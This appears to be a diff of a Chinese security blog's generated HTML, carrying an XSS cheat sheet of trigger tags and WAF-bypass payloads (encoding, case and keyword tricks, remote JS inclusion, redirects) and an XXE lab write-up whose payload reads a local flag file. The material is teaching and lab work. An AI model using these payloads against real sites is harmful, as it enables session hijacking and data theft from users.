-<h4 id="​​利用link远程包含js文件​​"><a href="#​​利用link远程包含js文件​​" class="headerlink" title="​​利用link远程包含js文件​​"></a>​<strong>​<code>利用link远程包含js文件</code>​</strong>​</h4><blockquote>
-<p>在无CSP的情况下才可以<br> <code>&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</code>​</p>
-</blockquote>
-<h4 id="​javascript伪协议​"><a href="#​javascript伪协议​" class="headerlink" title="​javascript伪协议​"></a>​<code>javascript伪协议</code>​</h4><blockquote>
-<p>​&#96;<a>标签<br><a href="javascript:alert('xss');">xss</a></a></p>
-<iframe>标签
-<iframe src="javascript:alert('xss');"></iframe>
-<img>标签
-<img src="/.com//javascript:alert('xss')">//IE7以下
-<form>标签
-<form action="Javascript:alert(1)"><input type="submit">`​</form></form></iframe></blockquote>
-<h4 id="​expression属性​"><a href="#​expression属性​" class="headerlink" title="​expression属性​"></a>​<code>expression属性</code>​</h4><blockquote>
-<p>​&#96;<img style="xss:expression(alert('xss''))"> &#x2F;&#x2F; IE7以下</p>
-<div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
-<style>#test{x:expression(alert(/XSS/))}</style> // IE7以下`​</blockquote>
-<h4 id="​background属性​"><a href="#​background属性​" class="headerlink" title="​background属性​"></a>​<code>background属性</code>​</h4><blockquote>
-<p>​<code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</code>​</p>
-</blockquote>
-<p>‍</p>
-<h3 id="存在过滤情况"><a href="#存在过滤情况" class="headerlink" title="存在过滤情况"></a>存在过滤情况</h3><h4 id="​过滤空格​​"><a href="#​过滤空格​​" class="headerlink" title="​过滤空格​​"></a><strong>​<code>过滤空格</code>​</strong>​</h4><blockquote>
-<p>用 &#x2F; 代替空格<br> <code>&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code>​</p>
-</blockquote>
-<h4 id="​​过滤关键字​​"><a href="#​​过滤关键字​​" class="headerlink" title="​​过滤关键字​​"></a>​<strong>​<code>过滤关键字</code>​</strong>​</h4><blockquote>
-<p>大小写绕过<br>​<code>&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;</code>​<br>双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)<br>​<code>&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;</code>​<br>字符拼接(利用eval)<br>​<code>&lt;img src=&quot;x&quot; onerror=&quot;a=aler;b=t;c=&#39;(xss);&#39;;eval(a+b+c)&quot;&gt;</code>​<br>字符拼接(利用top)<br>​<code>&lt;script&gt;top</code>​<a href="%60%60xss%60%60"><code>&quot;al&quot;+&quot;ert&quot;</code></a>​<code>;&lt;/script&gt;</code>​(只有两个&#96;&#96;这里是为了凸显出有&#96;符号)</p>
-</blockquote>
-<h4 id="​​其它字符混淆​​"><a href="#​​其它字符混淆​​" class="headerlink" title="​​其它字符混淆​​"></a>​<strong>​<code>其它字符混淆</code>​</strong>​</h4><blockquote>
-<p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子<br>可利用注释、标签的优先级等<br>​<code>&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;</code>​<br>​<code>&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;</code>​  </p>
-<title><img src="/.com//title">><img src="/.com//x" onerror="alert(xss);"> 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效  
-​`<SCRIPT>var a="\";alert("xss");//";</SCRIPT>`​</title></blockquote>
-<h4 id="​​编码绕过​​"><a href="#​​编码绕过​​" class="headerlink" title="​​编码绕过​​"></a>​<strong>​<code>编码绕过</code>​</strong>​</h4><blockquote>
-<p>​​<strong>​<code>Unicode编码绕过</code>​</strong>​<code> &lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt; &lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;</code>​<strong>​<code>url编码绕过</code>​</strong>​&#96;<br><img src="/.com//x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"></p>
-<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`​**​`Ascii码绕过`​**​`
-<img src="/.com//x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">`​**​`Hex绕过`​**​`
-<img src="/.com//x" onerror="eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')">`​**​`八进制绕过`​**​`
-<img src="/.com//x" onerror="alert('\170\163\163')">`​**​`base64绕过`​**​`
-<img src="/.com//x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
-<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">`​</iframe></blockquote>
-<h4 id="​​过滤双引号，单引号​​"><a href="#​​过滤双引号，单引号​​" class="headerlink" title="​​过滤双引号，单引号​​"></a>​<strong>​<code>过滤双引号，单引号</code>​</strong>​</h4><blockquote>
-<p>如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号<br> <code>&lt;img src=&quot;x&quot; onerror=alert(`xss`);&gt;</code>​<br> 使用编码绕过，具体看上面列举的例子</p>
-</blockquote>
-<h4 id="​​过滤括号​​"><a href="#​​过滤括号​​" class="headerlink" title="​​过滤括号​​"></a>​<strong>​<code>过滤括号</code>​</strong>​</h4><blockquote>
-<p>当括号被过滤的时候可以使用throw来绕过<br> <code>&lt;svg/onload=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;</code>​</p>
-</blockquote>
-<h4 id="​​过滤url地址​​"><a href="#​​过滤url地址​​" class="headerlink" title="​​过滤url地址​​"></a>​<strong>​<code>过滤url地址</code>​</strong>​</h4><blockquote>
-<p>使用url编码<br>&lt;img src&#x3D;”x” onerror&#x3D;document.location&#x3D;<code>http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/</code>​&gt;<br>使用IP<br>​<code>&lt;img src=&quot;x&quot; onerror=document.location=http://2130706433/&gt;十进制 &lt;img src=&quot;x&quot; onerror=document.location=http://0177.0.0.01/&gt;八进制 &lt;img src=&quot;x&quot; onerror=document.location=http://0x7f.0x0.0x0.0x1/&gt;十六进制 &lt;img src=&quot;x&quot; onerror=document.location=//www.baidu.com&gt;html标签中用//可以代替http:// 使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)</code>​<br>使用中文逗号代替英文逗号<br>​<code>&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www。baidu。com``&quot;&gt;//会自动跳转到百度</code>​</p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/XSS/XSS%E5%B8%B8%E8%A7%81%E7%9A%84%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE/" data-id="cmawcq0mw001ork7k5q7qcy0m" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/XXE（XML外部实体注入）/XXE-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/XXE-labs/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="XXE-labs"><a href="#XXE-labs" class="headerlink" title="XXE-labs"></a>XXE-labs</h1><blockquote>
-<p>我发现输入得用户名以 &#x3D;&#x3D;弹窗（alert）&#x3D;&#x3D; 的形式输出</p>
-</blockquote>
-<p><img src="/.com//image-20250422222903-k9ji6kx.png" alt="image">​</p>
-<blockquote>
-<p>同时 F12 进行前端查看 发现 在提交按钮处有</p>
-<p>​<code>&lt;button id=&quot;go&quot; onclick=&quot;XMLFunction()&quot;&gt;GO!&lt;/button&gt;</code>​</p>
-</blockquote>
-<p>&#x3D;&#x3D;说明我们的 数据传输方式为 xml&#x3D;&#x3D;<br> 当然，我们也可以直接 在burp suite 进行抓包查看</p>
-<p><img src="/.com//image-20250422223115-kr6nf3v.png" alt="image">​</p>
-<blockquote>
-<p>我们看到了 xml 文档声明：</p>
-<p>​<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>​</p>
-</blockquote>
-<p>所以，可能存在 xxe 漏洞</p>
-<p> 我们构造payload</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。<br>因此，在这里我们利用 这一特性 我们在向服务器上传的文档中 使用外部实体 (通过引用定义在外部的 DTD 中的实体，我们称之为外部实体) 来访问我们 的 flag<br>有人可能会问 flag 也不会是 dtd 文件啊<br>我们在使用外部实体访问的时候，会对我们访问的文件进行检查是否为 dtd 文件，此时如果没有检测的话，就可以引用非dtd文件<br>造成漏洞，这就是xxe</p>
-</blockquote>
-<p>所以到了这个时候，我们也就能够明白我们上面构造的payload的含义了：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span>    <span class="comment">&lt;!--使用admin实体--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span>                        <span class="comment">&lt;!--声明admin实体--&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>在这里 usename 和 password 都存在 xxe 漏洞，所以两者之间 都可以进行 xxe 注入</p>
-<p> 点击 go 发现 flag</p>
-<p><img src="/.com//40ff3cea6e98dbb09db72be6393d5d29-20250422223739-segc056.png" alt="40ff3cea6e98dbb09db72be6393d5d29"></p>
-<p>当然在这里我们也可以 使用 postman （本质是一样的，都是传递参数 将我们的payload传递到后台 php）</p>
-<p> 我们查看源代码，发现是 post 传参</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">XMLFunction</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;root&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;username&gt;&#x27;</span> + $(<span class="string">&#x27;#username&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/username&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;password&gt;&#x27;</span> + $(<span class="string">&#x27;#password&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/password&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;/root&gt;&#x27;</span>; &lt;!--转化数据格式   串行格式化数据--&gt;</span><br><span class="line">            <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();   &lt;!--实例化<span class="title class_">XMLHttpRequest</span> 对象--&gt;</span><br><span class="line">            xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123; &lt;!--页面初始化--&gt;</span><br><span class="line">                <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span> == <span class="number">4</span>)&#123; &lt;!--实时跟踪异步响应状态，监听函数 readyState4 数据接收完毕  此时可以获取完整的响应数据--&gt;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">readyState</span>);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);  &lt;!--接受数据--&gt;</span><br><span class="line">                    <span class="title function_">alert</span>(xmlhttp.<span class="property">responseText</span>);&lt;!--弹窗 接受数据--&gt;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;  </span><br><span class="line">            xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;login.php&quot;</span>,<span class="literal">true</span>); &lt;!---建立 post请求，要求异步响应   xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, url, <span class="literal">false</span>)--&gt;</span><br><span class="line">            xmlhttp.<span class="title function_">send</span>(xml);  &lt;!--发送请求--&gt;</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>上面有两点值得我们注意：</p>
-<ol>
-<li>是 post 传参</li>
-<li>接受地址是 login.php</li>
-</ol>
-<p> 现在我们使用 postman 了</p>
-<p><img src="/.com//454b83cf5da1b573bd3c3081543785ab-20250422223813-1wlcleh.png" alt="454b83cf5da1b573bd3c3081543785ab">​</p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/XXE-labs/" data-id="cmawcq0mx001rrk7k8sllgq9k" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" data-id="cmawczpnu0016ik7k0a6g1xre" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -3019,7 +2347,252 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/MIME%20%E7%B1%BB%E5%9E%8B/" data-id="cmawcq0mx001wrk7kas6t234s" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/MIME%20%E7%B1%BB%E5%9E%8B/" data-id="cmawczpnu0018ik7k33kjas7t" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/XSS/XSStrike" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/XSS/XSStrike/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h1><p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/XSS/XSStrike/" data-id="cmawczpnv001eik7ka6rice1t" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/XSS/XSS常见的触发标签" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/XSS/XSS%E5%B8%B8%E8%A7%81%E7%9A%84%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS常见的触发标签"><a href="#XSS常见的触发标签" class="headerlink" title="XSS常见的触发标签"></a>XSS常见的触发标签</h1><h3 id="过滤情况"><a href="#过滤情况" class="headerlink" title="过滤情况"></a>过滤情况</h3><h4 id="​​"><a href="#​​" class="headerlink" title="​&lt;script&gt;​"></a>​<code>&lt;script&gt;</code>​</h4><blockquote>
+<p>​<code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>​</p>
+</blockquote>
+<h4 id="​​-1"><a href="#​​-1" class="headerlink" title="​&lt;img&gt;​"></a>​<code>&lt;img&gt;</code>​</h4><blockquote>
+<p>图片加载错误时触发<br>​<code>&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</code>​<br>​<code>&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;</code>​<br>鼠标指针移动到元素时触发<br>​<code>&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;</code>​<br>鼠标指针移出时触发<br>​<code>&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</code>​</p>
+</blockquote>
+<h4 id="​​-2"><a href="#​​-2" class="headerlink" title="​&lt;a&gt;​"></a>​<code>&lt;a&gt;</code>​</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.qq.com">qq</a><br>&lt;a href&#x3D;javascript:alert(‘xss’)&gt;test<br><a href="javascript:a" onmouseover="alert(/xss/)">aa</a><br>&lt;a href&#x3D;”” onclick&#x3D;alert(‘xss’)&gt;a<br>&lt;a href&#x3D;”” onclick&#x3D;eval(alert(‘xss’))&gt;aa<br>&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000 onmouseover&#x3D;prompt(‘xss’) y&#x3D;2016&gt;aa</p>
+</blockquote>
+<h4 id="​​-3"><a href="#​​-3" class="headerlink" title="​&lt;input&gt;​"></a>​<code>&lt;input&gt;</code>​</h4><blockquote>
+<p>​<code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt;</code>​<br>竞争焦点，从而触发onblur事件<br>​<code>&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</code>​<br>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>​<code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;</code>​<br>​<code>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;</code>​<br>​<code>&lt;input value=&quot;&quot; onclick=alert(&#39;xss&#39;) type=&quot;text&quot;&gt;</code>​<br>​<code>&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#39;xss&#39;) bad=&quot;&quot;&gt;</code>​<br>​<code>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>​<br>按下按键时触发<br>​<code>&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;</code>​<br>按下按键时触发<br>​<code>&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;</code>​<br>松开按键式时触发<br>​<code>&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</code>​</p>
+</blockquote>
+<h4 id="​​-4"><a href="#​​-4" class="headerlink" title="​&lt;from&gt;​"></a>​<code>&lt;from&gt;</code>​</h4><blockquote>
+<p>​&#96;&lt;form action&#x3D;javascript:alert(‘xss’) method&#x3D;”get”&gt;</p>
+<form action="javascript:alert('xss')">`​  
+​`<form method="post" action="aa.asp?" onmouseover="prompt('xss')">
+<form method="post" action="aa.asp?" onmouseover="alert('xss')">
+<form action="1" onmouseover="alert('xss)">`​  
+​`<form method="post" action="data:text/html;base64,<script>alert('xss')</script>">`​  
+​`<form method="post" action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">`​</form></form></form></form></form></form></blockquote>
+<h4 id="​​-5"><a href="#​​-5" class="headerlink" title="​&lt;iframe&gt;​"></a>​<code>&lt;iframe&gt;</code>​</h4><blockquote>
+<p>​&#96; &lt;iframe onload&#x3D;alert(“xss”);&gt;</p>
+<iframe src="javascript:alert('xss')"></iframe>
+<iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
+<iframe src="data:text/html;base64,<script>alert('xss')</script>">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
+<iframe src="aaa" onmouseover="alert('xss')"><iframe>
+<iframe src="javascript&colon;prompt&lpar;``xss``&rpar;"></iframe>(‍````只有两个``) `​</iframe></iframe></iframe></iframe></blockquote>
+<h4 id="​​-6"><a href="#​​-6" class="headerlink" title="​&lt;svg&gt;​"></a>​<code>&lt;svg&gt;</code>​</h4><blockquote>
+<p>​<code>&lt;svg onload=alert(1)&gt;</code>​</p>
+</blockquote>
+<h4 id="​​-7"><a href="#​​-7" class="headerlink" title="​&lt;body&gt;​"></a>​<code>&lt;body&gt;</code>​</h4><blockquote>
+<p>​<code>&lt;body onload=&quot;alert(1)&quot;&gt;</code>​<br>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发<br>​<code>&lt;body onscroll=alert(&quot;xss&quot;);&gt;</code>​</p>
+<p>​<code>&lt;input autofocus&gt;</code>​</p>
+</blockquote>
+<h4 id="​​-8"><a href="#​​-8" class="headerlink" title="​&lt;button&gt;​"></a>​<code>&lt;button&gt;</code>​</h4><blockquote>
+<p>元素上点击鼠标时触发<br> <code>&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;</code>​</p>
+</blockquote>
+<h4 id="​​-9"><a href="#​​-9" class="headerlink" title="​&lt;p&gt;​"></a>​<code>&lt;p&gt;</code>​</h4><blockquote>
+<p>元素上按下鼠标时触发<br> <code>&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code>​<br> 元素上释放鼠标时触发<br> <code>&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code>​</p>
+</blockquote>
+<h4 id="​​-10"><a href="#​​-10" class="headerlink" title="​&lt;details&gt;​"></a>​<code>&lt;details&gt;</code>​</h4><blockquote>
+<p>​<code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;</code>​<br>使用open属性触发ontoggle事件，无需用户去触发<br>​<code>&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;</code>​</p>
+</blockquote>
+<h4 id="​​-11"><a href="#​​-11" class="headerlink" title="​&lt;select&gt;​"></a>​<code>&lt;select&gt;</code>​</h4><blockquote>
+<p>​<code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</code>​<br>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>​<code>&lt;select onfocus=alert(1) autofocus&gt;</code>​</p>
+</blockquote>
+<h4 id="​​-12"><a href="#​​-12" class="headerlink" title="​&lt;video&gt;​"></a>​<code>&lt;video&gt;</code>​</h4><blockquote>
+<p>​<code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</code>​</p>
+</blockquote>
+<h4 id="​​-13"><a href="#​​-13" class="headerlink" title="​&lt;audio&gt;​"></a>​<code>&lt;audio&gt;</code>​</h4><blockquote>
+<p>​<code>&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt;</code>​</p>
+</blockquote>
+<h4 id="​​-14"><a href="#​​-14" class="headerlink" title="​&lt;textarea&gt;​"></a>​<code>&lt;textarea&gt;</code>​</h4><blockquote>
+<p>​<code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</code>​</p>
+</blockquote>
+<h4 id="​​-15"><a href="#​​-15" class="headerlink" title="​&lt;keygen&gt;​"></a>​<code>&lt;keygen&gt;</code>​</h4><blockquote>
+<p>​<code>&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</code>​</p>
+</blockquote>
+<h4 id="​​-16"><a href="#​​-16" class="headerlink" title="​&lt;marquee&gt;​"></a>​<code>&lt;marquee&gt;</code>​</h4><blockquote>
+<p>​<code>&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</code>​</p>
+</blockquote>
+<h4 id="​​-17"><a href="#​​-17" class="headerlink" title="​&lt;isindex&gt;​"></a>​<code>&lt;isindex&gt;</code>​</h4><blockquote>
+<p>​<code>&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</code>​</p>
+</blockquote>
+<h4 id="​​利用link远程包含js文件​​"><a href="#​​利用link远程包含js文件​​" class="headerlink" title="​​利用link远程包含js文件​​"></a>​<strong>​<code>利用link远程包含js文件</code>​</strong>​</h4><blockquote>
+<p>在无CSP的情况下才可以<br> <code>&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</code>​</p>
+</blockquote>
+<h4 id="​javascript伪协议​"><a href="#​javascript伪协议​" class="headerlink" title="​javascript伪协议​"></a>​<code>javascript伪协议</code>​</h4><blockquote>
+<p>​&#96;<a>标签<br><a href="javascript:alert('xss');">xss</a></a></p>
+<iframe>标签
+<iframe src="javascript:alert('xss');"></iframe>
+<img>标签
+<img src="/.com//javascript:alert('xss')">//IE7以下
+<form>标签
+<form action="Javascript:alert(1)"><input type="submit">`​</form></form></iframe></blockquote>
+<h4 id="​expression属性​"><a href="#​expression属性​" class="headerlink" title="​expression属性​"></a>​<code>expression属性</code>​</h4><blockquote>
+<p>​&#96;<img style="xss:expression(alert('xss''))"> &#x2F;&#x2F; IE7以下</p>
+<div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
+<style>#test{x:expression(alert(/XSS/))}</style> // IE7以下`​</blockquote>
+<h4 id="​background属性​"><a href="#​background属性​" class="headerlink" title="​background属性​"></a>​<code>background属性</code>​</h4><blockquote>
+<p>​<code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</code>​</p>
+</blockquote>
+<p>‍</p>
+<h3 id="存在过滤情况"><a href="#存在过滤情况" class="headerlink" title="存在过滤情况"></a>存在过滤情况</h3><h4 id="​过滤空格​​"><a href="#​过滤空格​​" class="headerlink" title="​过滤空格​​"></a><strong>​<code>过滤空格</code>​</strong>​</h4><blockquote>
+<p>用 &#x2F; 代替空格<br> <code>&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code>​</p>
+</blockquote>
+<h4 id="​​过滤关键字​​"><a href="#​​过滤关键字​​" class="headerlink" title="​​过滤关键字​​"></a>​<strong>​<code>过滤关键字</code>​</strong>​</h4><blockquote>
